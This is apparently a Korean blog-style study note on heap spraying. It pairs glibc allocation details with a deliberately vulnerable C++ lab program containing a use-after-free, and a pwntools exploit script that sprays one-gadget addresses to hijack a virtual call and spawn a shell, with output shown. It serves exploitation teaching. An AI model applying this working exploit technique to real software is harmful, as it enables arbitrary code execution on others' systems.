---
title: Heap Spray
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, heap spray]
math: true
mermaid: true
---


## Description

heap 영역을 확장하면서 해당 영역에 특정 값으로 가득 채우는 기법이다. exploit의 성공 가능성을 높이기 위해 많은 양의 heap 공간 요청한다. heap 영역에 주소 값 또는 nop + shellcode로 채워지는 것이 일반적이다. 대부분의 아키텍처와 운영체제에서 대규모 heap이 할당되는 시작 위치는 예측 가능하다. 즉, heap spray가 실행될 때마다 대략적으로 동일한 위치에 spray된 heap이 존재한다. heap을 연속적으로 할당한 경우 대부분 순차적으로 할당한다.

## Example code

```c
//g++ -o poc poc.cpp -ldl
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <cstring>
  
void heapSpray(){
    int size;
    char *data;
  
    printf("Input size:\n");
    read(0, &size, 4);
    if (size > 0) {
        printf("Input contents:\n");
        data = new char[size];
        read(0, data, size);
    }
}
  
int main(){
    printf("Heap spray!\n");
    while(1){
        char status[2];
        heapSpray();
        printf("Will you keep typing?(No:0):\n");
        read(0,&status,2);
  
        if(atoi(status) == 0){
            printf("Exit!\n");
            break;
        }
    }
    return 0;
}
```

0x10000 size로 0x10000000까지 heap 영역을 생성한다.

```python
from pwn import *
#context.log_level = 'debug'

sprayRange = 0x10000000
spraySize = 0x10000
sprayCount = sprayRange /spraySize

p = process('./poc')

for i in xrange(sprayCount):
    size = spraySize - 0x10
    p.recvuntil("Input size:\n")
    p.send(p32(size))

    p.recvuntil("Input contents:\n")
    buf = 'AAAABBBB' * (size // 8)
    buf += 'C' * (size - len(buf))
    p.send(buf)

    p.recvuntil("Will you keep typing?(No:0):\n")
    if i == sprayCount-1:
        # print "Finished Heap spray!\n"
        # gdb.attach(p)
        raw_input('1')
        p.sendline(str(0))
    else:
        p.sendline(str(1))

p.wait()
```

heap 영역 유추가 가능하다.

```
[Process 1]
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /home/bs/Desktop/pwnable/heapspray/poc
0x00600000         0x00601000         r--p  /home/bs/Desktop/pwnable/heapspray/poc
0x00601000         0x00602000         rw-p  /home/bs/Desktop/pwnable/heapspray/poc
0x00c5a000         0x10c6d000         rw-p  [heap]
[Process 2]
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /home/bs/Desktop/pwnable/heapspray/poc
0x00600000         0x00601000         r--p  /home/bs/Desktop/pwnable/heapspray/poc
0x00601000         0x00602000         rw-p  /home/bs/Desktop/pwnable/heapspray/poc
0x024ea000         0x124fd000         rw-p  [heap]
[Process 3]
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /home/bs/Desktop/pwnable/heapspray/poc
0x00600000         0x00601000         r--p  /home/bs/Desktop/pwnable/heapspray/poc
0x00601000         0x00602000         rw-p  /home/bs/Desktop/pwnable/heapspray/poc
0x023ac000         0x123bf000         rw-p  [heap]
```

### DEFAULT_MMAP_THRESHOLD_MIN

linux에서 heap spray를 사용할 때 할당 크기가 0x20000(128 * 1024) 이상일 경우 heap 영역을 확장하지 않는다. `mmap()`을 사용하여 새로 할당 된 메모리 영역에 데이터를 저장하기 때문에 heap spray 공격이 어렵다.

```c
/*
  MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically
  adjusted MMAP_THRESHOLD.
*/

#ifndef DEFAULT_MMAP_THRESHOLD_MIN
#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)
#endif

#ifndef DEFAULT_MMAP_THRESHOLD_MAX
  /* For 32-bit platforms we cannot increase the maximum mmap
    threshold much because it is also the minimum value for the
    maximum heap size and its alignment.  Going above 512k (i.e., 1M
    for new heaps) wastes too much address space.  */
# if __WORDSIZE == 32
#  define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024)
# else
#  define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long))
# endif
#endif
```

`malloc()`은 `DEFAULT_MMAP_THRESHOLD_MIN`의 값을 이용하여 할당할 heap의 크기가 크거나 같은지 확인한다. 
* 값이 작을 경우 기존 할당된 heap 영역에 공간을 확장 
* 값이 클 경우 `mmap()`으로 새로운 메모리 영역 할당

```c
#define M_MMAP_THRESHOLD      -3

#ifndef DEFAULT_MMAP_THRESHOLD
#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN
#endif

...

static struct malloc_par mp_ =
{
  .top_pad = DEFAULT_TOP_PAD,
  .n_mmaps_max = DEFAULT_MMAP_MAX,
  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,
  .trim_threshold = DEFAULT_TRIM_THRESHOLD,
...
}

static void *
sysmalloc (INTERNAL_SIZE_T nb, mstate av)
{

...

if (av == NULL
    || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
        && (mp_.n_mmaps < mp_.n_mmaps_max)))
    {
      char *mm;           /* return value from mmap call*/
  
    try_mmap:
      /*
        Round up size to nearest page.  For mmapped chunks, the overhead
        is one SIZE_SZ unit larger than for normal chunks, because there
        is no following chunk whose prev_size field could be used.
  
        See the front_misalign handling below, for glibc there is no
        need for further alignments unless we have have high alignment.
      */
      if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)
        size = ALIGN_UP (nb + SIZE_SZ, pagesize);
```

**heap spray 전**

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /home/bs/Desktop/pwnable/heapspray/poc
0x00600000         0x00601000         r--p  /home/bs/Desktop/pwnable/heapspray/poc
0x00601000         0x00602000         rw-p  /home/bs/Desktop/pwnable/heapspray/poc
0x007b7000         0x007e9000         rw-p  [heap]
0x00007f460f72b000 0x00007f460f741000 r-xp  /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f460f741000 0x00007f460f940000 ---p  /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f460f940000 0x00007f460f941000 rw-p  /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f460f941000 0x00007f460fa49000 r-xp  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fa49000 0x00007f460fc48000 ---p  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fc48000 0x00007f460fc49000 r--p  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fc49000 0x00007f460fc4a000 rw-p  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fc4a000 0x00007f460fe0a000 r-xp  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f460fe0a000 0x00007f461000a000 ---p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f461000a000 0x00007f461000e000 r--p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f461000e000 0x00007f4610010000 rw-p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f4610010000 0x00007f4610014000 rw-p  mapped
0x00007f4610014000 0x00007f4610186000 r-xp  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610186000 0x00007f4610386000 ---p  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610386000 0x00007f4610390000 r--p  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610390000 0x00007f4610392000 rw-p  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610392000 0x00007f4610396000 rw-p  mapped
0x00007f4610396000 0x00007f46103bc000 r-xp  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f461059b000 0x00007f46105a1000 rw-p  mapped
0x00007f46105bb000 0x00007f46105bc000 r--p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f46105bc000 0x00007f46105bd000 rw-p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f46105bd000 0x00007f46105be000 rw-p  mapped
0x00007ffe5d615000 0x00007ffe5d636000 rw-p  [stack]
0x00007ffe5d703000 0x00007ffe5d706000 r--p  [vvar]
0x00007ffe5d706000 0x00007ffe5d708000 r-xp  [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
```

heap spray 후 heap 영역 확장되지 않고 `mmap(0x00007f45ff0f9000 ~ 0x00007f460f72b000)`으로 새로운 영역이 mapping 된다.

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /home/bs/Desktop/pwnable/heapspray/poc
0x00600000         0x00601000         r--p  /home/bs/Desktop/pwnable/heapspray/poc
0x00601000         0x00602000         rw-p  /home/bs/Desktop/pwnable/heapspray/poc
0x007b7000         0x007e9000         rw-p  [heap]
0x00007f45ff0f9000 0x00007f460f72b000 rw-p  mapped
0x00007f460f72b000 0x00007f460f741000 r-xp  /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f460f741000 0x00007f460f940000 ---p  /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f460f940000 0x00007f460f941000 rw-p  /lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007f460f941000 0x00007f460fa49000 r-xp  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fa49000 0x00007f460fc48000 ---p  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fc48000 0x00007f460fc49000 r--p  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fc49000 0x00007f460fc4a000 rw-p  /lib/x86_64-linux-gnu/libm-2.23.so
0x00007f460fc4a000 0x00007f460fe0a000 r-xp  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f460fe0a000 0x00007f461000a000 ---p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f461000a000 0x00007f461000e000 r--p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f461000e000 0x00007f4610010000 rw-p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007f4610010000 0x00007f4610014000 rw-p  mapped
0x00007f4610014000 0x00007f4610186000 r-xp  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610186000 0x00007f4610386000 ---p  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610386000 0x00007f4610390000 r--p  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610390000 0x00007f4610392000 rw-p  /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.21
0x00007f4610392000 0x00007f4610396000 rw-p  mapped
0x00007f4610396000 0x00007f46103bc000 r-xp  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f46103cd000 0x00007f46105a1000 rw-p  mapped
0x00007f46105bb000 0x00007f46105bc000 r--p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f46105bc000 0x00007f46105bd000 rw-p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007f46105bd000 0x00007f46105be000 rw-p  mapped
0x00007ffe5d615000 0x00007ffe5d636000 rw-p  [stack]
0x00007ffe5d703000 0x00007ffe5d706000 r--p  [vvar]
0x00007ffe5d706000 0x00007ffe5d708000 r-xp  [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
```

## Proof of concept

```python
//g++ -o heapspray heapspray.cpp -ldl
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <dlfcn.h>
 
class UAF {
    char memo[160];
 
public:
    UAF(char *memo) {
        strncpy(this->memo,memo,strlen(this->memo));
    }
 
    virtual void target() {
        write(1, this->memo, strlen(this->memo));
    }
};
 
void heapSpray(){
    int size;
    char *data;
 
    printf("Input size:\n");
    read(0, &size, 4);
    if (size > 0) {
        printf("Input contents:\n");
        data = new char[size];
        read(0, data, size);
    }
}
 
int main(){
    char memo[160] = {};
 
    void *printf_addr = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
 
    printf("Heap spray!\n");
    while(1){
        char status[2];
        heapSpray();
        printf("Will you keep typing?(No:0):\n");
        read(0,&status,2);
 
        if(atoi(status) == 0)
            break;
    }
 
    printf("Create vtable\n");
    read(0, memo, sizeof(memo));
 
    UAF *uaf = new UAF(memo);
    delete uaf;
 
    printf("UAF!\n");
    heapSpray();
 
    uaf->target();
 
    return 0;
}
```

## Exploit plan

1. heap spray를 이용해 heap 영역을 one gadget 주소로 채움
2. UAF를 이용해 heap spray된 Heap 주소를 유추하여 저장
3. `uaf->target()` 코드는 heap spray된 영역에 저장된 one gadget 주소를 `target()` 함수의 시작 주소로 판단하고 실행

## Exploit code

```python
from pwn import *
 
#context.log_level = 'debug'
 
spraySize = 0x10000
sprayRange = 0x10000000
sprayCount = sprayRange /spraySize
target = 0x5000000
 
p = process('./heapspray')
#sleep(20)
p.recvuntil("Printf() address : ")
libcAddr = p.recvuntil('\n')
libcAddr = int(libcAddr,16)
 
libcBase = libcAddr - 0x55800
oneGadget = libcBase + 0xf02a4
 
log.info('target : '+hex(target))
log.info('libcBase Addr : '+hex(libcBase))
log.info('oneGadget Addr : '+hex(oneGadget))
 
for i in xrange(sprayCount):
    size = spraySize - 0x10
    p.recvuntil("Input size:\n")
    p.send(p32(size))
 
    p.recvuntil("Input contents:\n")
    buf = p64(oneGadget) * (size // 8)
    buf += 'A' * (size-len(buf))
    p.send(buf)
 
    p.recvuntil("Will you keep typing?(No:0):\n")
    if i == sprayCount-1:
        print "Finished Heap spray!\n"
        p.sendline(str(0))
    else:
        p.sendline(str(1))
 
p.recvuntil("Create vtable\n")
p.send("Hello Heap spray & UAF")
 
p.recvuntil("Input size:\n")
p.send(p32(160))

p.recvuntil("Input contents:\n")
buf = p64(target) * (160 // 8)  # Expected Heap Address(0x5000000)
buf += 'C' * (160-len(buf))
p.send(buf)
 
p.interactive()
```

## Exploit

```bash
$ python ex.py 
[+] Starting local process './heapspray': pid 3086
[*] target : 0x5000000
[*] libcBase Addr : 0x7f3163ed9000
[*] oneGadget Addr : 0x7f3163fc92a4
Finished Heap spray!

[*] Switching to interactive mode
$ id
uid=1000(bs) gid=1000(bs) groups=1000(bs),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

## References
- [11.Heap Spray](https://www.lazenca.net/display/TEC/11.Heap+Spray)